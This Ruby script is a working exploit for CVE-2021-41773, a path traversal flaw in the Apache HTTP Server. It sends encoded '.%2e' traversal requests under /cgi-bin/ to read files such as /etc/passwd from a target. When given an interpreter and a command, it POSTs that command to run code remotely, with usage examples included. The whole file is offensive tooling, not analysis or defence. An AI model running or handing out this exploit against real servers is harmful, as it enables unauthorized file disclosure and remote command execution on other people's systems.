#!/usr/bin/ruby
# Author: n3k00n3

require 'uri'
require 'net/http'

def usage
  puts """
  usage:
    Simple Scan: ./CVE-2021-41773.rb <url>
    RCE: CVE-2021-41773.rb <file> <remote command exec>

    example: CVE-2021-41773.rb bla.com /bin/bash whoami
  """ 
end

if ARGV[0].nil?
  usage()
	exit 0
end

url = ARGV[0]
file = ARGV[1]
command = ARGV[2]
file = 'etc/passwd' if file.nil?

path = "#{url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/#{file}"

def rce_request(path, command)
  res = make_request(path, command)
end


def make_request(path, command)
  uri = URI.parse("#{path}")
  request = Net::HTTP::Post.new(uri)

  req_options = {
    use_ssl: uri.scheme == "https",
    verify_mode: OpenSSL::SSL::VERIFY_NONE,
  }

  request.body = "echo Content-Type: text/plain; echo; #{command}" if !command.nil?
  
  res = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
  end
end 

def scanner(path)
  res = make_request(path, command = false)

  if !res.is_a?(Net::HTTPSuccess)
    puts "Sorry, Not Vulnarable!"
    exit 0
  end
  puts res.body
end

if !command.nil?
  res = rce_request(path, command)
  puts res.body
  exit 0
end

scanner(path)
